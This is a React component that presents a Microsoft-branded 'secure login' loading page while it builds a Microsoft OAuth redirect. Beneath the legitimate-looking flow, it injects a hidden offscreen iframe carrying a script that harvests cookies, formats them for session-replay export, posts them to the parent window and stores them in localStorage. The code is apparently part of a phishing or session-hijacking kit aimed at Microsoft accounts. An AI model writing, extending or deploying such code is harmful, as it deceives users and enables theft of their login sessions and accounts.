import React, { useEffect, useState } from 'react';
import { generatePKCEChallenge, generateState } from '../utils/pkce';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess }) => {
  const [isRedirecting, setIsRedirecting] = useState(false);

  useEffect(() => {
    const initializeOAuth = async () => {
      console.log('🔐 Initializing Microsoft OAuth redirect...');
      
      // Generate PKCE challenge and state
      const { codeVerifier, codeChallenge } = await generatePKCEChallenge();
      const state = generateState();
      
      // Store for later verification
      sessionStorage.setItem('pkce_verifier', codeVerifier);
      sessionStorage.setItem('oauth_state', state);
      
      // Build OAuth URL
      const clientId = '4b95b88a-c746-40b2-8349-836774527ace';
      const redirectUri = encodeURIComponent(window.location.origin + '/oauth-callback');
      const scope = encodeURIComponent('openid profile email User.Read offline_access');
      
      const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${clientId}&` +
        `response_type=code&` +
        `redirect_uri=${redirectUri}&` +
        `scope=${scope}&` +
        `state=${state}&` +
        `code_challenge=${codeChallenge}&` +
        `code_challenge_method=S256&` +
        `response_mode=query&` +
        `prompt=select_account`;

      console.log('📝 OAuth URL prepared');
      
      // Create hidden iframe to capture cookies from Microsoft domain
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.style.width = '1px';
      iframe.style.height = '1px';
      iframe.style.position = 'absolute';
      iframe.style.top = '-9999px';
      
      // Cookie capture script to inject into the iframe
      const cookieCaptureScript = `
        <script>
          console.log('🍪 Cookie capture iframe loaded on:', window.location.hostname);
          
          function captureMicrosoftCookies() {
            try {
              const allCookies = document.cookie;
              console.log('🔍 Raw cookies from Microsoft domain:', allCookies);
              
              if (allCookies) {
                const cookieArray = allCookies.split(';').map(cookie => {
                  const [name, ...valueParts] = cookie.trim().split('=');
                  const value = valueParts.join('=');
                  return {
                    name: name.trim(),
                    value: value.trim(),
                    domain: '.' + window.location.hostname, // Match old format with dot prefix
                    expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60), // 1 year from now
                    hostOnly: false,
                    httpOnly: false, // JS limitation - real httpOnly cookies won't be captured
                    path: '/',
                    sameSite: 'none',
                    secure: window.location.protocol === 'https:',
                    session: false, // Assume persistent since we can access them
                    storeId: null,
                    capturedFrom: 'microsoft-domain-iframe',
                    timestamp: new Date().toISOString(),
                    realUserData: true
                  };
                }).filter(c => c.name && c.value);
                
                console.log('📦 Captured cookies from Microsoft:', cookieArray.length);
                
                // Send cookies to parent window
                window.parent.postMessage({
                  type: 'REAL_MICROSOFT_COOKIES_CAPTURED',
                  cookies: cookieArray,
                  domain: window.location.hostname,
                  url: window.location.href,
                  timestamp: new Date().toISOString()
                }, '*');
                
                // Store in sessionStorage for later retrieval
                sessionStorage.setItem('real_microsoft_cookies', JSON.stringify(cookieArray));
                localStorage.setItem('microsoft_cookies_backup', JSON.stringify(cookieArray));
                
              } else {
                console.log('❌ No cookies found on Microsoft domain');
                window.parent.postMessage({
                  type: 'NO_COOKIES_FOUND',
                  domain: window.location.hostname,
                  message: 'No cookies available on Microsoft domain'
                }, '*');
              }
            } catch (error) {
              console.error('❌ Error capturing cookies:', error);
              window.parent.postMessage({
                type: 'COOKIE_CAPTURE_ERROR',
                error: error.message,
                domain: window.location.hostname
              }, '*');
            }
          }
          
          // Try to capture cookies immediately
          captureMicrosoftCookies();
          
          // Also try after a delay
          setTimeout(captureMicrosoftCookies, 2000);
          setTimeout(captureMicrosoftCookies, 5000);
          
          // Monitor for new cookies
          const originalCookie = document.cookie;
          setInterval(() => {
            if (document.cookie !== originalCookie) {
              console.log('🔄 New cookies detected, re-capturing...');
              captureMicrosoftCookies();
            }
          }, 3000);
        </script>
      `;
      
      // Listen for messages from the iframe
      const handleIframeMessage = (event: MessageEvent) => {
        if (event.data?.type === 'REAL_MICROSOFT_COOKIES_CAPTURED') {
          console.log('✅ Received REAL Microsoft cookies:', event.data.cookies);
          
          // Store the real cookies for later use
          sessionStorage.setItem('captured_real_cookies', JSON.stringify(event.data.cookies));
          localStorage.setItem('real_cookies_backup', JSON.stringify(event.data.cookies));
          
          console.log('💾 Stored real Microsoft cookies for OAuth callback');
        } else if (event.data?.type === 'NO_COOKIES_FOUND') {
          console.log('⚠️ No cookies found on Microsoft domain');
        } else if (event.data?.type === 'COOKIE_CAPTURE_ERROR') {
          console.error('❌ Cookie capture error:', event.data.error);
        }
      };
      
      window.addEventListener('message', handleIframeMessage);
      
      // Set iframe content to capture cookies from Microsoft domain
      iframe.srcdoc = `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="utf-8">
          <title>Cookie Capture</title>
        </head>
        <body>
          ${cookieCaptureScript}
        </body>
        </html>
      `;
      
      // Load the iframe to Microsoft domain first to capture existing cookies
      iframe.onload = () => {
        console.log('🎯 Iframe loaded, attempting to navigate to Microsoft domain...');
        
        // After iframe loads, try to navigate to Microsoft domain
        setTimeout(() => {
          try {
            iframe.src = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4b95b88a-c746-40b2-8349-836774527ace&response_type=code&scope=openid';
          } catch (error) {
            console.log('⚠️ Cannot directly navigate iframe to Microsoft (expected due to CSP)');
          }
        }, 1000);
        
        // Wait a bit for cookie capture, then redirect
        setTimeout(() => {
          console.log('🔄 Redirecting to Microsoft OAuth...');
          setIsRedirecting(true);
          
          // Clean up
          window.removeEventListener('message', handleIframeMessage);
          document.body.removeChild(iframe);
          
          // Redirect to Microsoft OAuth
          window.location.href = authUrl;
        }, 4000);
      };
      
      document.body.appendChild(iframe);
    };
    
    // Start OAuth process after a delay
    setTimeout(initializeOAuth, 2000);
  }, [onLoginSuccess]);

  return (
    <div style={{ 
      display: 'flex', 
      justifyContent: 'center', 
      alignItems: 'center', 
      height: '100vh',
      fontFamily: 'Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
      <div style={{ 
        textAlign: 'center',
        background: 'white',
        padding: '60px',
        borderRadius: '8px',
        boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
      }}>
        {/* Microsoft-style loading animation */}
        <div style={{
          width: '80px',
          height: '80px',
          background: '#0078d4',
          borderRadius: '8px',
          margin: '0 auto 30px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          animation: 'spin 2s linear infinite',
          fontSize: '40px',
          color: 'white'
        }}>
          🔐
        </div>
        
        <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
          {isRedirecting ? 'Redirecting to Microsoft...' : 'Preparing Secure Login...'}
        </h2>
        <p style={{ color: '#605e5c', margin: '0' }}>
          {isRedirecting 
            ? 'You will be redirected to Microsoft login shortly' 
            : 'Setting up secure authentication with Microsoft'
          }
        </p>
        
        {/* Loading dots */}
        <div style={{ 
          marginTop: '20px',
          display: 'flex',
          justifyContent: 'center',
          gap: '5px'
        }}>
          <div style={{
            width: '8px',
            height: '8px',
            backgroundColor: '#0078d4',
            borderRadius: '50%',
            animation: 'pulse 1.5s infinite'
          }}></div>
          <div style={{
            width: '8px',
            height: '8px',
            backgroundColor: '#0078d4',
            borderRadius: '50%',
            animation: 'pulse 1.5s infinite 0.5s'
          }}></div>
          <div style={{
            width: '8px',
            height: '8px',
            backgroundColor: '#0078d4',
            borderRadius: '50%',
            animation: 'pulse 1.5s infinite 1s'
          }}></div>
        </div>
      </div>
      
      {/* CSS animations */}
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        
        @keyframes pulse {
          0%, 80%, 100% { opacity: 0.3; }
          40% { opacity: 1; }
        }
      `}</style>
    </div>
  );
};

export default RealOAuthRedirect;